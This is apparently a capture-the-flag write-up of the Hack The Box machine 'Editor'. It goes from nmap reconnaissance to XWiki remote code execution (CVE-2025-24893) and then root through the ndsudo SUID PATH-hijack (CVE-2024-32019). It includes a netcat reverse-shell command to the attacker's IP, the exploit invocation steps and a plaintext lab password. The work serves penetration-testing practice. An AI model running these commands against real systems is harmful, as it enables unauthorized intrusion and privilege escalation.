---
icon: ubuntu
---

# Editor - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.80 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 12:25 EST
Nmap scan report for 10.10.11.80
Host is up (0.043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   89.95 ms 10.10.16.1
2   27.12 ms 10.10.11.80
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

Upon visiting the site we are meet with a redirect, let's add it to our hosts file

```bash
10.10.11.80 	editor.htb
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Further inspecting the site does not reveal anything of interest. Let's take a quick peek at port 8080 as well

### <mark style="color:$primary;">XWiki RCE versions 15.10.11, 16.4.1 & 16.5.0RC1</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a version at the bottom of the site!

After a quick google search we come across a RCE POC that might work for this version as well.

{% embed url="https://github.com/gunzf0x/CVE-2025-24893" %}

let's clone it and give it a try.

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
```

{% code overflow="wrap" %}
```bash
python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.16.2 80 -e /bin/bash'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2787).png" alt=""><figcaption></figcaption></figure>

We managed to get a shell as xwiki!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2788).png" alt=""><figcaption></figcaption></figure>

Besides root, there is another user of interest on this machine. Let's see if there are any credentials in config files for oliver.

Configuration File locations for **xwiki**

{% embed url="https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/" %}

<figure><img src="../../.gitbook/assets/image (2790).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2789).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2791).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2792).png" alt=""><figcaption></figcaption></figure>

Found a password let's try it for the oliver user&#x20;

```
oliver:theEd1t0rTeam99
```

<figure><img src="../../.gitbook/assets/image (2793).png" alt=""><figcaption></figcaption></figure>

it works!

### <mark style="color:$primary;">Linpeas</mark>

### <mark style="color:$primary;">ndsudo SUID privesc</mark>

<figure><img src="../../.gitbook/assets/image (2794).png" alt=""><figcaption></figcaption></figure>

linpeas reveals a couple of unknown SUID's but the one that stands out is ndsudo

Googling about this tool I came across a Privesc POC at this repo

{% embed url="https://github.com/AzureADTrent/CVE-2024-32019-POC" %}

the gcc compiler is not available on the target machine. So I will be compiling the exploit on my kali host and deliver it via a simple python http server.

```bash
gcc poc.c -o nvme
```

<figure><img src="../../.gitbook/assets/image (2795).png" alt=""><figcaption></figcaption></figure>

After transfering it to the target machine run the following commands to privesc

```bash
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

<figure><img src="../../.gitbook/assets/image (2796).png" alt=""><figcaption></figcaption></figure>
